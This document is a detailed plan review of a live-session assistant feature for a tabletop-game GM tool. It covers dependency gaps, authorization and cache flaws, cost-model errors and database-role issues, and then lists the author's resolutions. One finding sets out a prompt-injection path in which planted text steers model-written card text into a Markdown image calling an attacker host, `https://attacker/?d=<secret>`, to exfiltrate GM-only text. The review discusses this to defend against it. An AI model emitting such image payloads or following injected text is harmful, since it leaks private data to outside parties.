# Plan Review: live-session-assistant — Live Session Assistant (turn 1)

Source: `docs/forge/research/live-session-assistant-gap-analysis.md`, `docs/forge/plans/live-session-assistant.md`, `docs/forge/plans/live-session-assistant-delivery.md`, `docs/forge/research/live-session-assistant-threat-model.md`, `docs/forge/research/live-session-assistant-cost-model.md`, and the bead specification/validator used to generate the delivery tables · Reviewed: 2026-09-16
Reviewer: independent read-only review-plan pass (same model tier as the author). Code baseline: local `master` `042b198`, `origin/master` `2ca91e6`. Tracker: `bd list --all --json --limit 0` (152 issues), `bd show`, `bd dep list`. Line numbers were taken at review time and may have shifted after revision.

## Verdict: NEEDS REVISION — 0/7/12/6

The code claims check out almost everywhere. The problems are with coordination and design:

- **Workbench model:** the plan contradicts the Workbench's in-progress decision record (participants are not accounts, two audiences, no player history).
- **Unlinked MVP dependencies:** cost reservations, age data, and the audit service.
- **Unaccounted leak:** the plan ignores a shipped remote-image exfiltration bug (`va8`).
- **Authorization flaws:** two mechanisms as written can leak data across players.

## Findings

### [HIGH] The plan aligns with an outdated Workbench model, and the alignment isn't linked where schemas freeze
**What:** The plan describes the handoff model:

- one reveal link, a per-document `reveal_mask`, and an owner audience;
- player accounts with per-account consent;
- cookie-authenticated per-recipient player channels;
- a "Shared with you" history;
- `yje.2.3` protecting player channels.

`LSA-1.2` only relates to `1kg.1.1`/`1kg.7.1`/`1kg.1.3`.

**Why:** The `1kg.1.1` decision record (untracked, branch `docs/1kg.1.1-gm-workbench-decisions`, defaults in force pending confirmation) says:

- participants are GM-created aliases, not accounts (AUD-1/E-6);
- device enrolment proves identity (AUD-3/E-1);
- there are only two audiences, `table` and `participant:<id>` (AUD-2);
- one live document per audience slot, with no player-side history (REVEAL-7/E-2).

The model also freezes earlier than `1kg.7.1`: in `1kg.2.1` (audience identities), `1kg.5.1` (reveal masks/audiences), and `1kg.5.3` (revealable flags and audiences). A relates-to edge doesn't prevent those from closing first — the "two permission systems" risk.

**Evidence:** Decision record: status line; slots 473–476; REVEAL-7 495; AUD-1..3 550–552; E-1/E-2 1005–1006. `bd` scope text for `1kg.2.1`, `1kg.5.1`, `1kg.5.3`; `bd dep list 1kg.7.1`. Confidence: Confirmed (record text and tracker scope); pending whether E-1/E-2/E-6 are confirmed as written.

**Suggested correction:**

- Update the gap analysis to the slot/participant model.
- Have `LSA-1.2` respond to AUD-1/2/3, REVEAL-7, and E-1/E-2/E-6.
- Link `LSA-1.2` as blocking `1kg.2.1`/`1kg.5.1`/`1kg.5.3`/`1kg.7.1`, or record an owner decision.
- Re-derive identity, consent, channel auth, and revocation (`yje.2.3` vs the `1kg.2.3` device credential).

### [HIGH] Cost reservation and realtime fanout are re-implemented instead of consumed
**What:** Principle 3 says shared foundations are consumed through blocking edges. But:

- `LSA-8.2` (pre-capture reservations) only relates to `yje.5.2`, which the cost model calls the binding control.
- `LSA-9.3` must work across two instances but only relates to `1kg.7.5`.

**Why:** `yje.5.2` is the shared reservation service ("Concurrency cannot overspend…"; a default per-account budget before entitlements exist). Because `LSA-8.2` is on the Phase 1 gate path, the MVP either builds a second reservation store or silently waits; `yje.5.2` is also missing from the MVP critical-path list. `1kg.7.5` and `1kg.8.6` already scope multi-instance fanout.

**Evidence:** `bd` text for `yje.5.2`, `1kg.7.5`, `1kg.8.6`. `yje.5.2` is blocked only by `yje.5.1`/`yje.1.2` (no cycle introduced). Confidence: Confirmed.

**Suggested correction:**

- Make `yje.5.2` block `LSA-8.2`, add it to the MVP path, and scope 8.2 as live allowances layered on it.
- Make `1kg.7.5` block `LSA-9.3`, or decide ownership in `LSA-1.11`.

### [HIGH] No bead provides the account age data the v1 minors policy requires
**What:** v1 disables listening when any linked participant account is under 18 or unknown, and "age attestation at signup is required (`yje.2.2`)". But `yje.2.2` only relates to `LSA-1.8`.

**Why:**

- `yje.2.2` scope (open signup, verification, abuse controls) has no age requirement, and no LSA bead adds one.
- Invite-created accounts have no age, so a literal implementation refuses all capture and a loose one silently drops the rule.
- The server precondition list for `LSA-3.5` omits account age, contradicting §3.10.

**Evidence:** `bd` text for `yje.2.2`; spec 1.4.3 and 3.5. Confidence: Confirmed.

**Suggested correction:** Add a bead for age attestation covering existing, new, and non-account participants. Make it block `LSA-3.5` and add it to the §3.2 precondition list — or restate v1 to rely only on `minors_may_be_present` plus attestation.

### [HIGH] The audit service isn't a prerequisite of Phase 1 despite the MVP's "full audit trail"
**What:** The MVP promises content-free audit events for capture, cards, corrections, and deletions. Phase 1 beads write audit events (`LSA-3.1`, `LSA-5.4`).

**Why:**

- `LSA-2.6` (the audit writer) blocks none of them, and the Phase 1 gate `LSA-13.2` doesn't require it; only the Phase 4/5 gates do.
- Validator R8 passes because it only checks that *some* gate requires each leaf, not the leaf's own phase gate.

**Evidence:** Read-only dependency analysis of the spec:

- 2.5 and 2.6 are not upstream of G1.
- Phase 1 leaves not required by G1: 2.5, 2.6 (plus the exempt 4.7 and 13.12).
- Beads that mention audit without depending on 2.6: 3.1, 5.4, 2.7, 9.4, 10.6.

Confidence: Confirmed.

**Suggested correction:**

- Make 2.6 block 3.1/4.2/5.4/6.2 and G1, and add "audit events verified content-free" to G1's acceptance criteria.
- Move 2.5 to Phase 4, or require it in G1.
- Add validator rule: every non-exempt Phase N leaf must be required by gate N.

### [HIGH] The baseline is one commit behind shipped code, and the shipped Markdown image-exfiltration bug (`va8`) is unaccounted for
**What:**

- The gap analysis treats local `042b198` as shipped truth.
- TM-15 is rated Low because there are "no fetched URLs".
- GM cards will render model-written text.
- `LSA-3.4` adds a CSP but never references `va8`.

**Why:**

- `origin/master` `2ca91e6` (PR #57) ships `ui/src/components/Markdown.tsx`, which uses DOMPurify defaults that keep remote `<img>`.
- Open bug `va8` records this leak, and neither host serves a CSP.
- Spoken or planted text can steer card text to `![](https://attacker/?d=<secret>)`, and the GM's browser would send GM-only text.
- The Workbench record fixes this for its own surfaces (X-10). This plan neither depends on that fix nor coordinates with it, and it duplicates va8's CSP work.

**Evidence:** `git log origin/master` (`2ca91e6 … (#57)`); `git show origin/master:ui/src/components/Markdown.tsx` lines 48–49 (`DOMPurify.sanitize(raw)`); `bd` text for `va8`; record X-10. Confidence: Confirmed.

**Suggested correction:**

- Re-baseline on `origin/master`.
- Make `va8` block `LSA-4.6` and G1, and relate or merge `LSA-3.4` with `va8`.
- Add "no remote subresources in card rendering" to 4.6.
- Rewrite TM-15 to cover client-side fetches.

### [HIGH] Revocation freshness compares revisions, not projection freshness
**What:**

- Each mutation bumps `authz_revision` in the same transaction.
- `table_chunks`, alias indexes, and caches rebuild later from the outbox, yet §4.9 lists "projection rows removed" as an immediate effect.
- Jobs record `authz_revision` at start and deliver when it is unchanged.
- Caches invalidate only by key revision.

**Why:** For a tightening:

1. Commit N+1.
2. A job starts and records N+1.
3. The rebuild hasn't run, so the job reads the old, permissive rows via RLS.
4. At delivery the revision still equals N+1, so it delivers.
5. The result is cached under N+1, which no later bump invalidates.

The egress filter only fingerprints GM-only/unclassified/unreleased text, so leaks to other players, groups, or characters escape it. `LSA-2.5` doesn't test the window between the bump and the rebuild.

**Evidence:** Master plan revision, projection, and cache text; spec 2.5. Confidence: Confirmed as a consequence of the stated mechanism.

**Suggested correction:**

- Track a per-campaign projection revision and require it to be ≥ `authz_revision` before player reads (fail closed), or apply tightening deletes synchronously.
- Never cache results computed from a stale projection.
- Add a test: revoke, then start a job before the rebuild runs.

### [HIGH] The cache "audience fingerprint" mixes ID spaces and can collide across players
**What:** `audience_fingerprint = HMAC(server_key, sorted(principal_ids ∪ group_ids ∪ character_ids))` is the separation between players' cache entries.

**Why:** The IDs are integers from different tables. Participant 3 (character 4, group 1) and participant 4 (character 3, group 1) both hash to `{1,3,4}`, so the player cache could return a character-4-scoped result to the wrong player.

**Evidence:** Master plan illustrative schema and §4.7 formula. Confidence: Confirmed.

**Suggested correction:** Fingerprint a typed tuple (`p:<participant>|c:<sorted chars>|g:<sorted groups>`) and add a property test that distinct principals never collide.

### [MEDIUM] The MVP trigger list contradicts the trigger taxonomy
**What:** The MVP covers T01/T04/T06/T07/T12/T15 in `GM_ON_REQUEST` form, but the taxonomy rows disagree:

- T01: phases 2–3, `GM_AUTO`/`GM_CANDIDATE`.
- T04: phases 2–3, `GM_CANDIDATE`.
- T12: phases 3/4/5.
- T15: `SYSTEM_ACTION` ("no action taken").

**Why:** The `LSA-10.1` test requires the registry to match the taxonomy, which would lock in a conflict with what Phase 1 ships.

**Confidence:** Confirmed.

**Suggested correction:** Add Phase 1 `GM_ON_REQUEST` to T01/T04/T12 and state T15's Phase 1 behavior, or narrow §7.1.

### [MEDIUM] Build-order edges delay MVP work that only needs enablement gating
**What / Why:** The longest path to G1 is 10 hops:

13.2 → 4.4 → 4.3 → 4.2 → 3.5 → 8.2 → 8.1 → 1.5 → 7.2 → 7.1

Several edges mean "must pass before enabling", not "must exist before building":

- 3.5 waits on 8.2 → 1.9 → `yje.1.2` and on 2.2 (the oracle-tested decision point), but capture needs only campaign role and consent.
- 4.3 (buildable against a fake) waits on 4.2.
- 6.3 waits on 1.10 → 1.2 (the contested decision); log canaries don't need the oracle.
- 2.3 waits on `xiu.1.2`, which only 2.4 needs.
- 4.5 waits on 5.1 and `1kg.5.2`, so rules-only triggers wait on campaign documents.

G1 already requires 1.9, 8.2, and 2.2, so enablement would still be blocked.

**Confidence:** Confirmed.

**Suggested correction:**

- Split 1.10 into a blocker-free canary harness and an oracle blocked by 1.2.
- Drop 4.2 from 4.3.
- Give 3.5 a reservation interface with a default budget.
- Move `xiu.1.2` from 2.3 to 2.4.
- Let rules-only extraction proceed before 5.1.

### [MEDIUM] The Phase 5 gate and some Phase 5 player features have no beads behind them
**What / Why:**

- Nothing depends on `LSA-13.11`, and no enablement bead follows it. Automation beads 12.1 and 12.3 only have the Phase 4 gate upstream.
- G5's acceptance criteria (adversarial extension, 30-day canary, counsel sign-off) have no beads, and the canary can't legally run before the gate under principle 1.
- T23 (player push-to-talk and free-form player answers) has no bead or legal item, contradicts §4.5 rule 3, and its vocabulary hints include secret names.
- T09's player "Combat started" notice has no bead.

**Confidence:** Confirmed.

**Suggested correction:** Add Phase 5 beads for the adversarial extension, counsel review, and a flagged canary the gate depends on, plus a post-gate enablement bead. Drop or plan the player parts of T23 and T09, and amend §4.5 rule 3.

### [MEDIUM] Visibility rules contradict themselves in four places
1. **Tightening.** "Projection rows removed; grants remain" conflicts with the visibility rule, which keeps grant holders' fields visible for non-`gm_only` audiences. Tightening to `gm_only` hides granted content anyway.
2. **Grants to characters vs "no retroactive grants"** on reassignment; the rule also names a single `P.subject`.
3. **Share to player A** writes a release plus an audience, which reveals the field to the field policy's whole audience unless the command rewrites the policy.
4. **Stop showing** keeps the release, so Phase 5 automation can re-show a field the GM panic-stopped (record REVEAL-4).

**Confidence:** Confirmed.

**Suggested correction:** Settle all four in `LSA-1.2`: whether share rewrites policy or writes per-subject grants; grant ownership on reassignment; that Stop revokes the release or blocks automation; and tightening's effect on grant holders' projections.

### [MEDIUM] Database-role separation is underspecified against the real deployment
**What / Why:**

- The projection builder is described with the `live_table_reader` role, which can only read `table_chunks`. No role is assigned to read released versions and write `table_chunks` (the declassification step).
- "The player pipeline process has no GM credentials" cannot hold: production is one Cloud Run service with one uvicorn process, and the player code is a module.
- The app connects as `postgres` with a password and creates tables at startup, so it owns them. PostgreSQL skips RLS for table owners unless `FORCE ROW LEVEL SECURITY` is set.
- Threat-model §6.4's "Cloud SQL socket with IAM" is wrong: IAM secures the socket, but the database login is a password.

**Evidence:** `Dockerfile.cloud:54`; `scripts/deploy.sh:142-155`; `docs/deploy-gcp.md:75-76,112`. Confidence: Confirmed.

**Suggested correction:**

- Add a projector role outside player code.
- Use a migration owner separate from runtime roles, and `FORCE ROW LEVEL SECURITY`.
- Wire secrets for each role.
- Deploy the player pipeline separately, or drop the claim.
- Fix §6.4.

### [MEDIUM] RLS settings are defined only for request transactions, but player deliveries run in workers; egress fingerprints miss player-to-player scopes
**What / Why:**

- `SET LOCAL` is set by the principal resolver in the request transaction, but deliveries run from the outbox and are recomposed per recipient, with no request transaction.
- A worker serving several recipients that skips an empty setting inherits the prior recipient's value.
- TM-02 adds "pool reset on checkout"; the master plan doesn't.
- Egress fingerprints cover only GM-only, unclassified, and unreleased text.

**Confidence:** Confirmed spec gap; whether an implementation would leak needs confirmation.

**Suggested correction:**

- Use one principal-scoped transaction helper for requests and workers: one recipient per transaction, every setting written (including empty values), and policies that fail closed on empty.
- Extend fingerprints to per-recipient invisible text, or state the gap.

### [MEDIUM] Premium margins are computed at more hours than the recommended $25 allowance
**What:** The recommendation is "$25 with a 12-hour allowance", but the $25 rows use the heavy (17.3 h) and power (20 h) personas, yielding 66.6% ("below target").

**Why:** Capped at 12 h, the heavy persona costs:

$1.50 + 150 × $0.0021 + 12 × $0.301 = $5.43 → **$18.25 (73.0%)**

The power persona comes to $17.48 (69.9%). The $25 vs $29 decision rests on usage the plan disallows.

**Confidence:** Confirmed by recomputation.

**Suggested correction:** Cap persona hours at the plan allowance (or add an "allowance exhausted" persona), then restate §1 and §13.

### [MEDIUM] The extraction cost model assumes a cadence the architecture doesn't use
**What:**

- Cost model: one call every 30 s over the last 2 minutes (≈120 calls/h, 292K input tokens).
- Architecture: 20–45 s windows stepping every utterance, calling the model whenever the lexicon finds candidates.
- The cost model itself assumes ≈300 utterance chunks/h.

**Why:** At ≈300 calls/h, extraction ≈ **$0.099/h** vs $0.045 modeled, raising the expected listening hour to ≈$0.36.

**Confidence:** Confirmed inconsistency; magnitude needs confirmation.

**Suggested correction:** Choose one cadence (for example, debounce extraction to ≥30 s) and align both documents.

### [MEDIUM] The cost model misstates the billing plan's shedding order
**What:** The cost model says live usage sheds first, citing the billing plan order "web search → premium routing → extras → media/live".

**Why:** The billing plan's order is web search → premium routing → extra structuring/suggestions → media generation. It doesn't mention "live". The monthly cap includes chat, so heavy early listening can starve chat. `LSA-8.2` and `yje.5.2` would implement conflicting priorities.

**Confidence:** Confirmed.

**Suggested correction:** Amend the billing plan via `yje.1.2` to place live usage and reserve chat headroom, or correct the cost-model statement.

### [MEDIUM] The Phase 1 "implicit PTT-only session" is undefined and has no dependency behind it
**What:** Precondition 3 allows "a PTT-only session is opened implicitly for Phase 1". Precondition 5 requires a GM attestation "for this session". `LSA-3.1` stores attestations per table session. `1kg.2.3` (table sessions) only blocks `LSA-9.3`.

**Why:** `1kg.2.3` limits live sessions per campaign, and the Workbench record fixes one live session per campaign tied to the table link (REVEAL-1/2). An implicit PTT session either violates that or is an undefined second concept, and attestation expiry is undefined in Phase 1.

**Confidence:** Confirmed.

**Suggested correction:** Define Phase 1 session and attestation scope in `LSA-1.8`. Then block 3.1 on `1kg.2.3`, or define a separate record that doesn't count against the Workbench limit.

### [MEDIUM] The $10 project-wide billing kill switch is not considered
**What:** The cost model plans ≈$64/month of recurring infrastructure (Valkey $22.48; Cloud SQL tier +$41.64). No bead depends on production spend controls.

**Why:** Production runs under a $10 budget whose kill switch detaches billing (`docs/deploy-gcp.md:6,174-199`). Open bead `yje.6.6` replaces it. New recurring infrastructure would trip the switch and take the service offline.

**Confidence:** Confirmed.

**Suggested correction:** Make `yje.6.6` block the first bead that adds recurring infrastructure, and mention it in the cost model.

### [MEDIUM] Other existing beads the plan depends on but doesn't link
- **`1kg.2.4`/`1kg.2.5`** (server conversation identity, client campaign selection): `LSA-2.4` requires campaign GM context in chat, and push-to-talk lives in the GM composer, but neither exists today.
- **`1kg.5.3`** (per-type field schemas with revealable flags and audiences): defines the field paths LSA-2.1/1.2/5.1 depend on.
- **`1kg.8.4`/`1kg.8.7`** (Workbench audio): the record already uses "listening" to mean audio playback, which collides with this plan's LISTENING capture indicator.
- **`yje.4.6`** (corpus entitlements): needed by `LSA-12.3`.
- **`xiu.2.4`** (prompt delimiting): referenced, but no LSA bead links it.
- **`1kg.7.2`** (sanitized projection): delivery §2 says Phase 4 shares it, but the spec has no edge.

**Confidence:** Confirmed.

**Suggested correction:** Add blocking edges `1kg.2.4`/`1kg.2.5` → 2.4/4.1/4.6 and `1kg.5.3` → 2.1/5.1. Add relates-to edges for the rest, plus a terminology decision in `LSA-1.8`.

### [LOW] The recorded validation doesn't match the validator's actual input and output
**What:** The delivery status says "Beads materialized". §7 claims 144 issues and "202 + 24 + 289" edges, and the gap analysis says 144.

**Why:** The validator input and live tracker have 152 issues and 308 `blocks` edges, and the validator reports 203 internal edges. Eight recently created issues account for the difference. No LSA beads exist yet.

**Confidence:** Confirmed.

**Suggested correction:** Print counts from the validator and regenerate §7; fix the status line; re-scan links against the current tracker.

### [LOW] Bead keys and phases drift between documents
- The master plan uses `LSA-D01`–`D09` (no D04); the spec and delivery plan use `LSA-1.x`.
- `LSA-07.2` is cited for per-trigger calibration, but spec 7.2 is the STT benchmark; `LSA-07.3` is zero-padded.
- Player recaps are Phase 4 in master §3.11 and spec 11.7, but Phase 5 elsewhere.
- T16 says the "lexicon ships P2 as candidate", but no Phase 2 bead exists.
- UI copy says "~0.25 of your 20 session-hours", but the $25 plan allows 12 hours.

**Confidence:** Confirmed.

**Suggested correction:** Map the D-keys to 1.x, fix the 07.x references, pick one phase for recaps, and align the copy.

### [LOW] Small factual errors about current code in the gap analysis
- The claim that `aria-live` exists only in the auth gate is wrong: `ui/src/shell/TopBar.tsx:28` has `aria-live="polite"`, and `App.tsx:59` is `role="alert"`.
- nginx limits apply only to Docker Compose; Cloud Run runs a single uvicorn serving the SPA and API with no nginx hop.
- The "newline stripping and 256-char caps" apply only to extra fields passed to `gcp_logging.emit` (two throttle callers). Ordinary logs, including provider exception text, are uncapped.

**Confidence:** Confirmed.

**Suggested correction:** Reword.

### [LOW] Portrait identifier guarantees need a stated mechanism
- Deterministic re-encoding produces identical bytes, so content-derived ETags repeat despite random keys.
- Short-lived signed redirects are forwardable bearer URLs, conflicting with "non-recipients cannot fetch".
- A CDN can't be revoked by revoking signed reads.

**Confidence:** Needs confirmation (GCS/CDN behavior).

**Suggested correction:** Serve bytes through the authorized endpoint with server-set ETags, or perturb bytes per derivative; state a CDN purge on retract or keep the CDN out of scope.

### [LOW] Consent and audit retention conflicts with campaign deletion cascades
**What / Why:** Consent and attestation records are "not deletable by GM" and kept for campaign lifetime plus a legal period; audit is kept 1 year. Yet "GM deletes the campaign (cascade + key destruction)" and `LSA-2.1` cascades on campaign deletion, which would delete evidence meant to outlive the campaign.

**Suggested correction:** Exclude consent, attestation, and audit records from the cascade (tombstone campaign ID), and test it in `LSA-6.2`.

### [LOW] The metrics catalog must be extended for live telemetry, and no bead owns that
**What / Why:** Live labels (trigger code, evidence state, vendor alias, outcome) are planned. `MetricLabels` forbids unknown fields and uses closed enums (`mode`, `route_template`), and the UI mirrors it. Live labels need a schema change, and a live "mode" label would collide with chat's.

**Suggested correction:** Add the catalog and label-schema extension (service and UI mirror) to `LSA-6.3`, or relate `1kg.9.2`/`b8o.5`.

## Verified as accurate (spot-checks)

**Retrieval, prompts, and tracing**
- `SecondaryRetriever.retrieve(prompt, k=5)` with an empty stub — `service/rag.py:44-56` ✓
- GM fan-out and a merge without provenance — `service/graph.py:133-142,185-187`; `service/rag.py:84-106` ✓
- Attachment concatenation — `service/app.py:504-523`; `service/generate.py:233-256` ✓
- `GROUNDED_TEMPLATE` — `service/generate.py:209` ✓; GM persona text — `:198-205` ✓
- Langfuse `CallbackHandler` behind `RAG_TRACING` — `service/tracing.py:25-27,66-77` ✓
- `_clean` — `service/gcp_logging.py:45-48` ✓ (scope caveat above)

**Auth, sessions, and chat**
- Per-instance rate limiter — `service/ratelimit.py:21-24` ✓
- `require_session` re-reads the user and fails closed — `service/app.py:335-361` ✓
- Atomic ownership claim — `:578-619` ✓; ID minted — `:741` ✓; GM 403 — `:731-732` ✓
- Synchronous `/chat` — `:710-863` ✓; verbatim provider exception logging — `:827-830` ✓

**Deployment and proxies**
- Cloud Run flags — `scripts/deploy.sh:152-155` ✓; single uvicorn — `Dockerfile.cloud:54` ✓
- nginx: no `Upgrade`/`Connection` headers, `proxy_read_timeout 120s` — `ui/nginx.conf` ✓

**Absent today**
- No `getUserMedia`/`MediaRecorder`/`AudioWorklet`/`WebSocket`/`EventSource`/SSE/transcription code — grep ✓
- No CSP or Permissions-Policy headers — grep ✓

**Data, schemas, and limits**
- Attachments: txt/md/pdf, extracted text only — `config.py:148`; `service/attachments.py`; `service/sql/04-chat-schema.sql` ✓
- Metrics label allowlists — `service/metrics.py:21-95` ✓
- Config values — `config.py:119,167,230,235` ✓
- Role check and deletion cascades — `service/sql/05-auth-schema.sql` ✓
- `dnd.chunks` shape — `vector-db/init/02-schema.sql` ✓

**UI and reusable code**
- Stale role docs — `README.md:18`; `ui/src/shell/modes.ts:44-45`; `ui/src/shell/currentUser.tsx:21-24` ✓
- `useChat` single in-flight request — `ui/src/useChat.ts:114,173` ✓
- Card components and `Avatar` `src` ✓
- Vocabulary matcher — `ingestion/retrieval.py` ✓; condition scope — `ingestion/scope.py:23-25` ✓
- Per-operation DB connections — `service/history.py:176-186` ✓
- `record_safely`, `ProviderClientFactory`, and the cited tests exist ✓

**Tracker and validator**
- All referenced external beads exist with matching titles; `1kg.1.1` is in progress ✓
- MVP external critical path of 10 ✓; 24 edges to existing beads ✓
- "Can start now" matches the ready leaves ✓
- Validator R3 (cycles), R7 (gate chaining), and R9 (player-disclosure dependencies) behave as claimed ✓
- No automatic player disclosure is reachable before `LSA-13.5` ✓

**Cost model**
- Arithmetic reproduces within rounding: per-hour and per-clip totals, persona COGS, margins, portfolio, increments, and break-even counts ✓
- Billing-plan fees, target, cap, and the $15 row match ✓

**Other plans**
- Memory plan M-D11/M-D15 ✓; Workbench 472 px chat floor ✓

## Not verified
- **Design archive** (`RevealSheet.jsx` line references, `wire-schema.md` quote): the archive isn't in the repo. The Workbench decision record independently confirms one link per campaign, `audience: 'owner'`, and `defaultReveal: ['all']`.
- **External inputs** (vendor prices, lifecycle dates, data-handling defaults, GCP and Stripe prices): excluded by instruction.
- **Mid-review additions** (master plan §5.11–§5.12 and threat-model §7): excluded.
- **Platform behavior not exercised:** Langfuse capture defaults, PostgreSQL `SET LOCAL` with pooling and owner RLS behavior, and GCS ETag semantics.
- **Workbench owner confirmation** of E-1, E-2, and E-6.

---

## Resolution (author response, applied before turn 2)

| Finding | Resolution |
| --- | --- |
| H1 Workbench model | **Plan:** re-derived around participants (aliases plus enrolled devices), guests, and slots. Visibility now separates eligibility (field policy), display (Workbench slots), and the disclosure ledger; durable grants are deferred to Phase 5. **Beads:** `LSA-1.2` now blocks `1kg.2.1`, `1kg.5.1`, `1kg.5.3`, and `1kg.7.1`; `yje.2.3` is relates-only. |
| H2 Reuse | `yje.5.2` → `LSA-8.2`; `1kg.7.5` → `LSA-9.3` and `11.2`; `1kg.7.2` → `11.1`; MVP path updated |
| H3 Age | Per-participant age attestation in consent records (3.1/3.2) and a server precondition (3.5); campaign `minors_may_be_present`; no dependence on account age |
| H4 Audit | Audit writer (2.6, no schema dependency) blocks 3.1/4.2/5.4/6.2 and G1; disclosure ledger split to 2.8; 2.5 moved to Phase 4; validator rule R8b added |
| H5 Baseline/va8 | Re-baselined on `origin/master` `2ca91e6`; `va8` blocks `LSA-4.6` and G1; 3.4 scoped to microphone policy; TM-15 rewritten |
| H6 Freshness | Tightenings apply synchronously; projection revision ≥ authz revision required before player reads; stale-projection results never cached; test added |
| H7 Fingerprint | Typed tuple fingerprint plus a collision property test |
| M1 Triggers | Taxonomy rows T01/T04/T12 gain Phase 1 `GM_ON_REQUEST`; T15 redefined |
| M2 Build order | 1.10 split (harness) and 1.12 (oracle); 4.3 no longer waits on 4.2; 3.5 uses the reservation interface; `xiu.1.2` moved to 2.4; 4.5 no longer waits on 5.1 |
| M3 Phase 5 | Added adversarial extension, counsel review, and internal-dogfood beads before G5, plus a post-gate enablement bead; player parts of T23/T09 dropped |
| M4 Visibility | Resolved in the eligibility/display/ledger model; Stop blocks automation re-display; grants deferred |
| M5 DB roles | Projector role; migration owner; `FORCE ROW LEVEL SECURITY`; per-role secrets; separate player service as a Phase 4 decision; §6.4 corrected |
| M6 Workers | Principal-scoped transaction helper for requests and workers; fail-closed empty settings; per-recipient fingerprints |
| M7 Margins | Personas capped at plan allowances; tables regenerated |
| M8 Cadence | Extraction debounced to ≥30 s; documents aligned |
| M9 Shedding | Statement corrected; placement proposed via `LSA-1.9`/`yje.1.2` |
| M10 PTT session | Capture requires a Workbench table session (`1kg.2.3` blocks 3.1); consent via the table link |
| M11 Kill switch | `yje.6.6` blocks `LSA-9.3`; noted in the cost model |
| M12 Links | `1kg.2.4`/`1kg.2.5`/`1kg.5.3`/`yje.4.6`/`1kg.7.2` edges added; relates for `xiu.2.4`, `1kg.8.4`/`1kg.8.7`; terminology decision in `LSA-1.8` |
| L1–L6 | Validator prints counts; D-keys removed; recaps moved to Phase 5; gap analysis corrected; portraits served per request with server-set ETags; compliance records excluded from cascade; metrics catalog extension in 6.3 |
